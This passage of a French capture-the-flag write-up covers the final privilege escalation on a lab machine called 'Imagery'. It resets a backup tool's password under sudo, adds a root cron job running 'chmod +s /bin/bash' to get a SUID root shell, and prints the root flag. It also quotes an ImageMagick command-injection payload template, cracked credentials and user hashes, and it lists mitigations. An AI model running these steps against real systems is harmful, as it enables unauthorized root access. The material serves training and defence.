+</span></span><span style="display:flex;"><span>Charcol: A CLI tool to create encrypted backup zip files.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>positional arguments:
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">{</span>shell,help<span style="color:#f92672">}</span>          Available commands
+</span></span><span style="display:flex;"><span>    shell               Enter an interactive Charcol shell.
+</span></span><span style="display:flex;"><span>    help                Show help message <span style="color:#66d9ef">for</span> Charcol or a specific command.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>options:
+</span></span><span style="display:flex;"><span>  --quiet               Suppress all informational output
+</span></span><span style="display:flex;"><span>  -R, --reset-password-to-default
+</span></span><span style="display:flex;"><span>                        Reset application password to default <span style="color:#f92672">(</span>requires system password verification<span style="color:#f92672">)</span>.
+</span></span></code></pre></div><p><strong>Option intéressante :</strong> <code>-R / --reset-password-to-default</code></p>
+<h3 id="exploitation---reset-du-mot-de-passe">Exploitation - Reset du Mot de Passe<a hidden class="anchor" aria-hidden="true" href="#exploitation---reset-du-mot-de-passe">#</a></h3>
+<p>L&rsquo;option <code>-R</code> permet de réinitialiser le mot de passe de l&rsquo;application Charcol en mode &ldquo;no password&rdquo; :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mark@Imagery:~$ sudo /usr/local/bin/charcol -R shell
+</span></span><span style="display:flex;"><span>Enter system password <span style="color:#66d9ef">for</span> user <span style="color:#e6db74">&#39;mark&#39;</span> to confirm: supersmash
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Attempting to reset Charcol application password to default.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>2025-12-21 17:49:16<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> System password verification required <span style="color:#66d9ef">for</span> this operation.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>2025-12-21 17:49:30<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> System password verified successfully.
+</span></span><span style="display:flex;"><span>Removed existing config file: /root/.charcol/.charcol_config
+</span></span><span style="display:flex;"><span>Charcol application password has been reset to default <span style="color:#f92672">(</span>no password mode<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Please restart the application <span style="color:#66d9ef">for</span> changes to take effect.
+</span></span></code></pre></div><h3 id="accès-au-shell-interactif-charcol">Accès au Shell Interactif Charcol<a hidden class="anchor" aria-hidden="true" href="#accès-au-shell-interactif-charcol">#</a></h3>
+<p>Avec le mot de passe réinitialisé, nous pouvons accéder au shell interactif en appuyant simplement sur <strong>Enter</strong> quand la passphrase est demandée :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mark@Imagery:~$ sudo /usr/local/bin/charcol shell
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  ░██████  ░██                                                  ░██ 
+</span></span><span style="display:flex;"><span> ░██   ░░██ ░██                                                  ░██ 
+</span></span><span style="display:flex;"><span>░██        ░████████   ░██████   ░██░████  ░███████   ░███████  ░██ 
+</span></span><span style="display:flex;"><span>░██        ░██    ░██       ░██  ░███     ░██    ░██ ░██    ░██ ░██ 
+</span></span><span style="display:flex;"><span>░██        ░██    ░██  ░███████  ░██      ░██        ░██    ░██ ░██ 
+</span></span><span style="display:flex;"><span> ░██   ░██ ░██    ░██ ░██   ░██  ░██      ░██    ░██ ░██    ░██ ░██ 
+</span></span><span style="display:flex;"><span>  ░██████  ░██    ░██  ░█████░██ ░██       ░███████   ░███████  ░██ 
+</span></span><span style="display:flex;"><span>                                                                    
+</span></span><span style="display:flex;"><span>Charcol The Backup Suit - Development edition 1.0.0
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>2025-12-21 17:50:28<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> Entering Charcol interactive shell.
+</span></span><span style="display:flex;"><span>charcol&gt;
+</span></span></code></pre></div><h3 id="analyse-de-la-commande-auto-add">Analyse de la Commande <code>auto add</code><a hidden class="anchor" aria-hidden="true" href="#analyse-de-la-commande-auto-add">#</a></h3>
+<p>En consultant l&rsquo;aide, nous découvrons la commande <code>auto add</code> qui permet d&rsquo;ajouter des tâches cron automatisées :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>charcol&gt; help
+</span></span></code></pre></div><p><strong>Extrait pertinent de l&rsquo;aide :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>  Automated Jobs (Cron):
+</span></span><span style="display:flex;"><span>    auto add --schedule &#34;&lt;cron_schedule&gt;&#34; --command &#34;&lt;shell_command&gt;&#34; --name &#34;&lt;job_name&gt;&#34;
+</span></span><span style="display:flex;"><span>      Purpose: Add a new automated cron job managed by Charcol.
+</span></span><span style="display:flex;"><span>      Security Warning: Charcol does NOT validate the safety of the --command.
+</span></span></code></pre></div><p><strong>Vulnérabilité critique :</strong> La documentation indique explicitement que <strong>Charcol ne valide PAS la sécurité de la commande</strong> !</p>
+<h3 id="exploitation---tâche-cron-malveillante">Exploitation - Tâche Cron Malveillante<a hidden class="anchor" aria-hidden="true" href="#exploitation---tâche-cron-malveillante">#</a></h3>
+<p>Nous créons une tâche cron qui s&rsquo;exécute chaque minute et ajoute le bit SUID sur <code>/bin/bash</code> :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>charcol&gt; auto add --schedule <span style="color:#e6db74">&#34;* * * * *&#34;</span> --command <span style="color:#e6db74">&#34;chmod +s /bin/bash&#34;</span> --name <span style="color:#e6db74">&#34;pwn&#34;</span>
+</span></span><span style="display:flex;"><span>Enter system password <span style="color:#66d9ef">for</span> user <span style="color:#e6db74">&#39;mark&#39;</span> to confirm: supersmash
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>2025-12-21 17:52:06<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> System password verification required <span style="color:#66d9ef">for</span> this operation.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>2025-12-21 17:52:06<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> System password verified successfully.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>2025-12-21 17:52:06<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> Auto job <span style="color:#e6db74">&#39;pwn&#39;</span> <span style="color:#f92672">(</span>ID: 5820eb89-b1a4-411a-a6d7-2d14b31e183f<span style="color:#f92672">)</span> added successfully.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>2025-12-21 17:52:06<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> Cron line added: * * * * * CHARCOL_NON_INTERACTIVE<span style="color:#f92672">=</span>true chmod +s /bin/bash
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>charcol&gt; exit
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>2025-12-21 17:52:15<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> Exiting Charcol shell.
+</span></span></code></pre></div><p><strong>Fonctionnement :</strong></p>
+<ol>
+<li>La tâche cron s&rsquo;exécute chaque minute (<code>* * * * *</code>)</li>
+<li>Elle est exécutée en tant que <strong>root</strong> (car <code>charcol</code> est lancé avec <code>sudo</code>)</li>
+<li>La commande <code>chmod +s /bin/bash</code> ajoute le bit SUID sur bash</li>
+</ol>
+<h3 id="obtention-du-shell-root">Obtention du Shell Root<a hidden class="anchor" aria-hidden="true" href="#obtention-du-shell-root">#</a></h3>
+<p>Après environ 60 secondes (exécution de la tâche cron), vérifions les permissions de <code>/bin/bash</code> :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mark@Imagery:~$ ls -l /bin/bash
+</span></span><span style="display:flex;"><span>-rwxr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">1474768</span> Oct <span style="color:#ae81ff">26</span>  <span style="color:#ae81ff">2024</span> /bin/bash
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Attendre ~60 secondes...</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>mark@Imagery:~$ ls -l /bin/bash
+</span></span><span style="display:flex;"><span>-rwsr-sr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">1474768</span> Oct <span style="color:#ae81ff">26</span>  <span style="color:#ae81ff">2024</span> /bin/bash
+</span></span></code></pre></div><p>Le bit SUID est bien présent (<code>s</code> dans <code>-rwsr-sr-x</code>). Nous pouvons maintenant obtenir un shell root avec l&rsquo;option <code>-p</code> qui préserve les privilèges :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mark@Imagery:~$ /bin/bash -p
+</span></span><span style="display:flex;"><span>bash-5.1# id
+</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>1002<span style="color:#f92672">(</span>mark<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1002<span style="color:#f92672">(</span>mark<span style="color:#f92672">)</span> euid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> egid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>,1002<span style="color:#f92672">(</span>mark<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p><strong>Nous sommes root !</strong></p>
+<h3 id="root-flag">Root Flag<a hidden class="anchor" aria-hidden="true" href="#root-flag">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>bash-5.1# cd /root
+</span></span><span style="display:flex;"><span>bash-5.1# cat root.txt
+</span></span><span style="display:flex;"><span>ae228b86e04c5f1f7070f879de0a6254
+</span></span></code></pre></div><hr>
+<h2 id="lessons-learned">Lessons Learned<a hidden class="anchor" aria-hidden="true" href="#lessons-learned">#</a></h2>
+<h3 id="vulnérabilités-exploitées---résumé">Vulnérabilités Exploitées - Résumé<a hidden class="anchor" aria-hidden="true" href="#vulnérabilités-exploitées---résumé">#</a></h3>
+<p>Cette machine illustre une chaîne complète d&rsquo;exploitation nécessitant plusieurs vulnérabilités :</p>
+<h4 id="1-blind-xss-cross-site-scripting">1. <strong>Blind XSS (Cross-Site Scripting)</strong><a hidden class="anchor" aria-hidden="true" href="#1-blind-xss-cross-site-scripting">#</a></h4>
+<ul>
+<li><strong>Localisation :</strong> Formulaire d&rsquo;upload d&rsquo;images (champs <code>title</code> et <code>description</code>)</li>
+<li><strong>Impact :</strong> Vol du cookie administrateur permettant l&rsquo;accès au panel admin</li>
+<li><strong>Root Cause :</strong> Absence de sanitisation des données utilisateur dans les métadonnées d&rsquo;images</li>
+<li><strong>Mitigation :</strong>
+<ul>
+<li>Implémenter un Content Security Policy (CSP) strict</li>
+<li>Encoder/échapper toutes les sorties HTML</li>
+<li>Valider et sanitizer tous les inputs utilisateur</li>
+<li>Utiliser des attributs <code>HttpOnly</code> et <code>Secure</code> sur les cookies sensibles</li>
+</ul>
+</li>
+</ul>
+<h4 id="2-path-traversal--lfi-local-file-inclusion">2. <strong>Path Traversal / LFI (Local File Inclusion)</strong><a hidden class="anchor" aria-hidden="true" href="#2-path-traversal--lfi-local-file-inclusion">#</a></h4>
+<ul>
+<li><strong>Localisation :</strong> <code>/admin/get_system_log</code> avec paramètre <code>log_identifier</code></li>
+<li><strong>Impact :</strong> Lecture de fichiers arbitraires sur le système (db.json, /etc/passwd, etc.)</li>
+<li><strong>Root Cause :</strong> Validation insuffisante du paramètre <code>log_identifier</code></li>
+<li><strong>Fichiers sensibles extraits :</strong>
+<ul>
+<li><code>/home/web/web/db.json</code> - Base de données contenant les hashes MD5 des utilisateurs</li>
+<li>Possibilité de lire d&rsquo;autres fichiers système sensibles</li>
+</ul>
+</li>
+<li><strong>Mitigation :</strong>
+<ul>
+<li>Implémenter une whitelist stricte des fichiers logs autorisés</li>
+<li>Utiliser <code>os.path.realpath()</code> et valider que le chemin reste dans le répertoire autorisé</li>
+<li>Ne jamais concaténer directement les inputs utilisateur avec des chemins de fichiers</li>
+<li>Implémenter une vérification de type <code>if not log_path.startswith(ALLOWED_DIR)</code></li>
+</ul>
+</li>
+</ul>
+<h4 id="3-weak-password-hashing-md5">3. <strong>Weak Password Hashing (MD5)</strong><a hidden class="anchor" aria-hidden="true" href="#3-weak-password-hashing-md5">#</a></h4>
+<ul>
+<li><strong>Localisation :</strong> Stockage des mots de passe dans <code>db.json</code></li>
+<li><strong>Impact :</strong> Cracking rapide des hashes avec des outils standards (John, Hashcat)</li>
+<li><strong>Hashes trouvés :</strong>
+<ul>
+<li><code>admin@imagery.htb:5d9c1d507a3f76af1e5c97a3ad1eaa31</code></li>
+<li><code>testuser@imagery.htb:2c65c8d7bfbca32a3ed42596192384f6</code></li>
+<li>Mark (trouvé dans le backup)</li>
+</ul>
+</li>
+<li><strong>Root Cause :</strong> Utilisation de MD5 sans salt pour le hachage des mots de passe</li>
+<li><strong>Mitigation :</strong>
+<ul>
+<li>Utiliser bcrypt, scrypt, ou Argon2 pour le hachage des mots de passe</li>
+<li>Implémenter un salt unique par utilisateur</li>
+<li>Ne jamais stocker les mots de passe en clair ou avec des algorithmes faibles</li>
+<li>Utiliser des bibliothèques éprouvées comme <code>werkzeug.security.generate_password_hash</code></li>
+</ul>
+</li>
+</ul>
+<h4 id="4-command-injection-via-imagemagick">4. <strong>Command Injection via ImageMagick</strong><a hidden class="anchor" aria-hidden="true" href="#4-command-injection-via-imagemagick">#</a></h4>
+<ul>
+<li><strong>Localisation :</strong> <code>/apply_visual_transform</code> endpoint avec paramètre <code>x</code> dans la transformation <code>crop</code></li>
+<li><strong>Impact :</strong> Exécution de commandes arbitraires en tant que l&rsquo;utilisateur <code>web</code></li>
+<li><strong>Root Cause :</strong> Utilisation non sécurisée d&rsquo;ImageMagick avec des inputs non validés</li>
+<li><strong>Payload exploité :</strong>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#e6db74">&#34;x&#34;</span>: <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;`</span><span style="color:#e6db74">{</span>reverse_shell_command<span style="color:#e6db74">}</span><span style="color:#e6db74">`&#34;</span>
+</span></span></code></pre></div></li>
+<li><strong>Mitigation :</strong>
+<ul>
+<li>Valider et sanitizer tous les paramètres numériques</li>
+<li>Utiliser une regex stricte : <code>^[0-9]+$</code></li>
+<li>Ne jamais passer des inputs utilisateur directement à des commandes shell</li>
+<li>Utiliser les bibliothèques Python (Pillow) plutôt que d&rsquo;appeler ImageMagick en ligne de commande</li>
+<li>Si ImageMagick est nécessaire, utiliser <code>shlex.quote()</code> pour échapper les arguments</li>
+</ul>
+</li>
+</ul>
+<h4 id="5-weak-encryption-password-aes-crypt">5. <strong>Weak Encryption Password (AES-Crypt)</strong><a hidden class="anchor" aria-hidden="true" href="#5-weak-encryption-password-aes-crypt">#</a></h4>
+<ul>
+<li><strong>Localisation :</strong> Fichier <code>/var/backup/web_20250806_120723.zip.aes</code></li>
+<li><strong>Impact :</strong> Accès au contenu du backup contenant des credentials</li>
+<li><strong>Root Cause :</strong> Mot de passe faible présent dans rockyou.txt</li>
+<li><strong>Temps de cracking :</strong> ~16 secondes avec 4 threads</li>
+<li><strong>Mitigation :</strong>
+<ul>
+<li>Utiliser des mots de passe forts (&gt;20 caractères, aléatoires)</li>
+<li>Implémenter une politique de mots de passe robuste</li>
+<li>Utiliser des générateurs de mots de passe</li>
+<li>Pour les backups critiques, utiliser des clés générées cryptographiquement</li>
+</ul>
+</li>
+</ul>
+<h4 id="6-sudo-misconfiguration">6. <strong>Sudo Misconfiguration</strong><a hidden class="anchor" aria-hidden="true" href="#6-sudo-misconfiguration">#</a></h4>
+<ul>
+<li><strong>Localisation :</strong> <code>/etc/sudoers</code> permettant <code>sudo /usr/local/bin/charcol</code></li>
+<li><strong>Impact :</strong> Escalade de privilèges vers root</li>
+<li><strong>Root Cause :</strong> Autorisation sudo trop permissive sans restrictions sur les fonctionnalités</li>
+<li><strong>Mitigation :</strong>
+<ul>
+<li>Limiter les commandes sudo aux fonctionnalités strictement nécessaires</li>
+<li>Utiliser des wrappers avec validation des arguments</li>
+<li>Ne jamais permettre l&rsquo;exécution d&rsquo;outils avec des fonctionnalités de cron/scheduled tasks</li>
+<li>Appliquer le principe du moindre privilège</li>
+</ul>
+</li>
+</ul>
+<h4 id="7-weak-password-reset-mechanism">7. <strong>Weak Password Reset Mechanism</strong><a hidden class="anchor" aria-hidden="true" href="#7-weak-password-reset-mechanism">#</a></h4>
+<ul>
+<li><strong>Localisation :</strong> Option <code>-R / --reset-password-to-default</code> de Charcol</li>
+<li><strong>Impact :</strong> Contournement de l&rsquo;authentification de l&rsquo;application</li>
+<li><strong>Root Cause :</strong> Reset du mot de passe nécessitant seulement le mot de passe système (déjà compromis)</li>
+<li><strong>Mitigation :</strong>
+<ul>
+<li>Implémenter une authentification multi-facteurs pour les opérations sensibles</li>
+<li>Ne pas permettre le reset vers un mode &ldquo;no password&rdquo;</li>
+<li>Requérir une confirmation supplémentaire (email, token, etc.)</li>
+<li>Logger toutes les opérations de reset de mot de passe</li>
+</ul>
+</li>
+</ul>
+<h4 id="8-command-injection-via-cron-critique">8. <strong>Command Injection via Cron (CRITIQUE)</strong><a hidden class="anchor" aria-hidden="true" href="#8-command-injection-via-cron-critique">#</a></h4>
+<ul>
+<li><strong>Localisation :</strong> Commande <code>auto add</code> dans Charcol shell</li>
+<li><strong>Impact :</strong> Exécution de commandes arbitraires en tant que root</li>
+<li><strong>Root Cause :</strong> <strong>Aucune validation des commandes</strong> dans <code>auto add</code></li>
+<li><strong>Citation de la documentation :</strong> <em>&ldquo;Charcol does NOT validate the safety of the &ndash;command&rdquo;</em></li>
+<li><strong>Payload exploité :</strong>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>auto add --schedule <span style="color:#e6db74">&#34;* * * * *&#34;</span> --command <span style="color:#e6db74">&#34;chmod +s /bin/bash&#34;</span> --name <span style="color:#e6db74">&#34;pwn&#34;</span>
+</span></span></code></pre></div></li>
+<li><strong>Mitigation :</strong>
+<ul>
+<li><strong>VALIDER ET SANITIZER toutes les entrées utilisateur</strong></li>
+<li>Implémenter une whitelist stricte des commandes autorisées</li>
+<li>Ne jamais exécuter directement des commandes utilisateur avec des privilèges élevés</li>
+<li>Utiliser <code>shlex.quote()</code> pour échapper tous les arguments</li>
+<li>Requérir une approbation supplémentaire pour les tâches cron sensibles</li>
+<li>Logger toutes les créations de tâches cron avec alertes</li>
+<li>Implémenter une validation de format : interdire les caractères spéciaux</li>
+<li>Utiliser un système de templates prédéfinis plutôt que des commandes arbitraires</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h2 id="attack-chain-summary">Attack Chain Summary<a hidden class="anchor" aria-hidden="true" href="#attack-chain-summary">#</a></h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span>[Reconnaissance Web]
+</span></span><span style="display:flex;"><span>       <span style="color:#960050;background-color:#1e0010">↓</span>
+</span></span><span style="display:flex;"><span>[Blind XSS Upload] <span style="color:#960050;background-color:#1e0010">→</span> Cookie Admin volé
+</span></span><span style="display:flex;"><span>       <span style="color:#960050;background-color:#1e0010">↓</span>
+</span></span><span style="display:flex;"><span>[LFI via <span style="color:#f92672">/</span>admin<span style="color:#f92672">/</span>get_system_log] <span style="color:#960050;background-color:#1e0010">→</span> db<span style="color:#f92672">.</span>json extrait
+</span></span><span style="display:flex;"><span>       <span style="color:#960050;background-color:#1e0010">↓</span>
+</span></span><span style="display:flex;"><span>[MD5 Cracking] <span style="color:#960050;background-color:#1e0010">→</span> Credentials testuser
+</span></span><span style="display:flex;"><span>       <span style="color:#960050;background-color:#1e0010">↓</span>
+</span></span><span style="display:flex;"><span>[Command Injection ImageMagick] <span style="color:#960050;background-color:#1e0010">→</span> Shell en tant que <span style="color:#e6db74">&#39;web&#39;</span>
+</span></span><span style="display:flex;"><span>       <span style="color:#960050;background-color:#1e0010">↓</span>
+</span></span><span style="display:flex;"><span>[AES<span style="color:#f92672">-</span>Crypt Backup Cracking] <span style="color:#960050;background-color:#1e0010">→</span> Credentials mark:supersmash
+</span></span><span style="display:flex;"><span>       <span style="color:#960050;background-color:#1e0010">↓</span>
+</span></span><span style="display:flex;"><span>[Pivot su mark]
+</span></span><span style="display:flex;"><span>       <span style="color:#960050;background-color:#1e0010">↓</span>
+</span></span><span style="display:flex;"><span>[Sudo Charcol] <span style="color:#960050;background-color:#1e0010">→</span> Password Reset (<span style="color:#f92672">-</span>R)
+</span></span><span style="display:flex;"><span>       <span style="color:#960050;background-color:#1e0010">↓</span>
+</span></span><span style="display:flex;"><span>[Charcol Shell Access] <span style="color:#960050;background-color:#1e0010">→</span> auto add command
+</span></span><span style="display:flex;"><span>       <span style="color:#960050;background-color:#1e0010">↓</span>
+</span></span><span style="display:flex;"><span>[Command Injection via Cron] <span style="color:#960050;background-color:#1e0010">→</span> chmod <span style="color:#f92672">+</span>s <span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>bash
+</span></span><span style="display:flex;"><span>       <span style="color:#960050;background-color:#1e0010">↓</span>
+</span></span><span style="display:flex;"><span>[SUID Bash] <span style="color:#960050;background-color:#1e0010">→</span> Root Shell (<span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>bash <span style="color:#f92672">-</span>p)
+</span></span></code></pre></div><hr>
+<h2 id="outils-utilisés">Outils Utilisés<a hidden class="anchor" aria-hidden="true" href="#outils-utilisés">#</a></h2>
+<h3 id="reconnaissance">Reconnaissance<a hidden class="anchor" aria-hidden="true" href="#reconnaissance">#</a></h3>
+<ul>
+<li><strong>nmap</strong> - Scan de ports et détection de services</li>
+<li><strong>ffuf</strong> - Fuzzing de répertoires web</li>
+<li><strong>whatweb</strong> - Fingerprinting de l&rsquo;application web</li>
+<li><strong>wafw00f</strong> - Détection de WAF</li>
+</ul>
+<h3 id="exploitation-web">Exploitation Web<a hidden class="anchor" aria-hidden="true" href="#exploitation-web">#</a></h3>
+<ul>
+<li><strong>Python3</strong> - Scripts d&rsquo;exploitation personnalisés</li>
+<li><strong>curl</strong> - Tests manuels des endpoints</li>
+<li><strong>Burp Suite / Request</strong> - Manipulation des requêtes HTTP</li>
+</ul>
+<h3 id="password-cracking">Password Cracking<a hidden class="anchor" aria-hidden="true" href="#password-cracking">#</a></h3>
+<ul>
+<li><strong>pyAesCrypt</strong> - Brute-force de fichiers AES-Crypt</li>
+<li><strong>John the Ripper</strong> - Cracking de hashes MD5</li>
+<li><strong>Hashcat</strong> - Alternative pour le cracking de hashes</li>
+<li><strong>rockyou.txt</strong> - Wordlist de passwords</li>
+</ul>
+<h3 id="post-exploitation">Post-Exploitation<a hidden class="anchor" aria-hidden="true" href="#post-exploitation">#</a></h3>
+<ul>
+<li><strong>rlwrap + nc</strong> - Listener pour reverse shell</li>
+<li><strong>Python pty</strong> - Stabilisation de shell</li>
+<li><strong>LinPEAS</strong> - Énumération Linux (optionnel)</li>
+</ul>
+<h3 id="scripts-personnalisés">Scripts Personnalisés<a hidden class="anchor" aria-hidden="true" href="#scripts-personnalisés">#</a></h3>
+<ul>
+<li><strong>BlindXSS.py</strong> - Injection XSS pour vol de cookie admin</li>
+<li><strong>lfi-exp3.py</strong> - Exploitation du Path Traversal</li>
+<li><strong>POC.py</strong> - RCE via ImageMagick command injection</li>
+<li><strong>aes_crack_threaded.py</strong> - Brute-force multi-thread AES-Crypt</li>
+</ul>
+<hr>
+<h2 id="timeline-de-lexploitation">Timeline de l&rsquo;Exploitation<a hidden class="anchor" aria-hidden="true" href="#timeline-de-lexploitation">#</a></h2>
+<ol>
+<li><strong>00:00</strong> - Scan nmap initial</li>
+<li><strong>00:05</strong> - Découverte de l&rsquo;application web Image Gallery</li>
+<li><strong>00:15</strong> - Identification de la vulnérabilité Blind XSS</li>
+<li><strong>00:25</strong> - Récupération du cookie admin</li>
+<li><strong>00:30</strong> - Découverte du LFI via /admin/get_system_log</li>
+<li><strong>00:40</strong> - Extraction de db.json avec credentials MD5</li>
+<li><strong>00:45</strong> - Cracking des hashes MD5</li>
+<li><strong>00:50</strong> - Découverte de la vulnérabilité ImageMagick</li>
+<li><strong>01:00</strong> - Obtention du reverse shell en tant que &lsquo;web&rsquo;</li>
+<li><strong>01:10</strong> - Découverte du backup AES dans /var/backup/</li>
+<li><strong>01:15</strong> - Transfert et cracking du fichier AES (~16 secondes)</li>
+<li><strong>01:20</strong> - Pivot vers l&rsquo;utilisateur mark (su mark)</li>
+<li><strong>01:25</strong> - User flag obtenu</li>
+<li><strong>01:30</strong> - Énumération sudo -l → charcol</li>
+<li><strong>01:35</strong> - Analyse de Charcol et découverte de -R</li>
+<li><strong>01:40</strong> - Reset du password Charcol</li>
+<li><strong>01:45</strong> - Accès au shell interactif Charcol</li>
+<li><strong>01:50</strong> - Exploitation de auto add pour cron job malveillant</li>
+<li><strong>01:51</strong> - Attente de l&rsquo;exécution du cron (60 secondes)</li>
+<li><strong>01:52</strong> - SUID bash confirmé</li>
+<li><strong>01:53</strong> - Root shell obtenu (/bin/bash -p)</li>
+<li><strong>01:54</strong> - Root flag obtenu</li>
+</ol>
+<p><strong>Temps total :</strong> ~2 heures (avec énumération complète)</p>
+<hr>
+<h2 id="recommandations-de-sécurité-prioritaires">Recommandations de Sécurité Prioritaires<a hidden class="anchor" aria-hidden="true" href="#recommandations-de-sécurité-prioritaires">#</a></h2>
+<h3 id="pour-les-développeurs">Pour les Développeurs<a hidden class="anchor" aria-hidden="true" href="#pour-les-développeurs">#</a></h3>
+<ol>
+<li>
+<p><strong>Input Validation PARTOUT</strong></p>
+<ul>
+<li>Implémenter une validation stricte sur tous les inputs utilisateur</li>
+<li>Utiliser des whitelists plutôt que des blacklists</li>
+<li>Encoder/échapper toutes les sorties</li>
+</ul>
+</li>
+<li>
+<p><strong>Cryptographie Robuste</strong></p>
+<ul>
+<li>Utiliser bcrypt/Argon2 pour les mots de passe</li>
+<li>Générer des mots de passe forts pour les backups</li>
+<li>Ne jamais utiliser MD5 pour le hachage de mots de passe</li>
+</ul>
+</li>
+<li>
+<p><strong>Principe du Moindre Privilège</strong></p>
+<ul>
+<li>Limiter les permissions des processus</li>
+<li>Ne jamais exécuter des commandes utilisateur avec des privilèges élevés</li>
+<li>Valider TOUTES les commandes avant exécution</li>
+</ul>
+</li>
+<li>
+<p><strong>Security Headers &amp; CSP</strong></p>
+<ul>
+<li>Implémenter Content-Security-Policy</li>
+<li>Utiliser HttpOnly et Secure sur tous les cookies</li>
+<li>Activer X-Frame-Options, X-Content-Type-Options</li>
+</ul>
+</li>
+</ol>
+<h3 id="pour-les-administrateurs-système">Pour les Administrateurs Système<a hidden class="anchor" aria-hidden="true" href="#pour-les-administrateurs-système">#</a></h3>
+<ol>
+<li>
+<p><strong>Configuration Sudo Sécurisée</strong></p>
+<ul>
+<li>Limiter au maximum les permissions sudo</li>
+<li>Éviter les outils permettant l&rsquo;exécution de commandes arbitraires</li>
+<li>Logger toutes les utilisations de sudo</li>
+</ul>
+</li>
+<li>
+<p><strong>Monitoring &amp; Alertes</strong></p>
+<ul>
+<li>Logger les accès aux fichiers sensibles</li>
+<li>Alerter sur les créations de tâches cron suspectes</li>
+<li>Monitorer les changements de permissions sur les binaires système</li>
+</ul>
+</li>
+<li>
+<p><strong>Backups Sécurisés</strong></p>
+<ul>
+<li>Utiliser des mots de passe forts générés aléatoirement</li>
+<li>Chiffrer les backups avec des clés robustes</li>
+<li>Stocker les backups dans des emplacements sécurisés avec permissions restreintes</li>
+</ul>
+</li>
+</ol>
+<hr>
+<h2 id="références">Références<a hidden class="anchor" aria-hidden="true" href="#références">#</a></h2>
+<ul>
+<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html">OWASP - XSS Prevention</a></li>
